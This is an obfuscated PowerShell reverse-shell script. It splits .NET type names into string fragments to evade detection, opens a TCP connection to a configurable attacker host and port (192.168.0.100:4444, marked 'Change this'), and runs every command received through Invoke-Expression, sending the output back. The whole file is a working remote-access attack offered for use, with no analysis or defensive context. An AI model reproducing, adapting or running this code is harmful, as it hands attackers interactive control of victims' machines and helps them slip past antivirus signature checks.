$l = ('{0}{1}{2}{3}' -f '192.','168','.0.','100') #Change this!!!!!!!!!!
$p = 4444 #Change this!!!!!!!!!!
$c = ('{0}{1}{2}{3}{4}' -f 'Ne','t.So','ckets','.TCP','Client')
$s = ('{0}{1}{2}' -f 'IO.','Strea','mReader')
$w = ('{0}{1}{2}' -f 'IO.','Strea','mWriter')
$b = ('{0}{1}{2}{3}' -f 'Syst','em.B','yte[',']')

$t = New-Object $c($l, $p)
$n = $t.GetStream()
$r = New-Object $s($n)
$wr = New-Object $w($n)
$wr.AutoFlush = $true
$buf = New-Object $b 1024

while ($t.Connected) {
    while ($n.DataAvailable) {
        $raw = $n.Read($buf, 0, $buf.Length)
        $code = ([text.encoding]::UTF8).GetString($buf, 0, $raw - 1)
    }
    if ($t.Connected -and $code.Length -gt 1) {
        $out = try { Invoke-Expression ($code) 2>&1 } catch { $_ }
        $wr.Write("$out`n")
        $code = $null
    }
}
$t.Close()
$n.Close()
$r.Close()
$wr.Close()